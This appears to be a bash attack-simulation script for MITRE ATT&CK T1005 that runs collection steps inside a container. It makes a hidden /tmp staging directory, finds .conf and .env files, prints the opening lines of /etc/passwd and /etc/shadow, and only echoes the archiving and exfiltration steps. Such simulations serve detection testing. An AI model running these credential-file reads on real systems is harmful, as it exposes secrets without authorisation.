#!/bin/bash
# Attack: Collection via Automated Collection
# MITRE ATT&CK: Collection - T1005
# Severity: MEDIUM
# Description: Automatically collects sensitive data from the container filesystem

set -e
echo "[+] Starting: Collection via Automated Collection"
echo "[+] MITRE ATT&CK: T1005 - Data from Local System"
echo "[+] Severity: MEDIUM"
echo ""

echo "[*] Step 1: Creating collection staging area..."
STAGING_DIR="/tmp/.collection_$(date +%s)"
mkdir -p "$STAGING_DIR"
echo "[*] Staging directory: $STAGING_DIR"

echo ""
echo "[*] Step 2: Collecting configuration files..."
echo "[*] Searching for config files..."
find /etc -maxdepth 2 -name "*.conf" 2>/dev/null | head -5 | while read file; do
    echo "[+] Found: $file"
done

echo ""
echo "[*] Step 3: Collecting environment files..."
find / -maxdepth 3 -name ".env" 2>/dev/null | head -3 | while read file; do
    echo "[+] Found: $file"
done

echo ""
echo "[*] Step 4: Collecting password files..."
for file in /etc/passwd /etc/shadow /etc/group; do
    if [ -r "$file" ]; then
        echo "[+] Readable: $file"
        head -3 "$file"
    fi
done

echo ""
echo "[*] Step 5: Collecting recent files..."
echo "[*] Recently modified files in /tmp:"
find /tmp -type f -mtime -1 2>/dev/null | head -5

echo ""
echo "[*] Step 6: Archiving collected data..."
echo "[*] tar -czf $STAGING_DIR/collected_data.tar.gz ..."

echo ""
echo "[*] Step 7: Preparing for exfiltration..."
echo "[*] Collection size: $(du -sh $STAGING_DIR 2>/dev/null | cut -f1)"

echo ""
echo "[*] Cleanup..."
rm -rf "$STAGING_DIR"

echo ""
echo "[✓] Automated collection completed"
echo "[i] In a real attack, this would:"
echo "    - Search for sensitive file types (*.doc, *.xls, *.pdf)"
echo "    - Collect browser data and credentials"
echo "    - Archive and compress for exfiltration"
echo "    - Stage data in hidden directories"
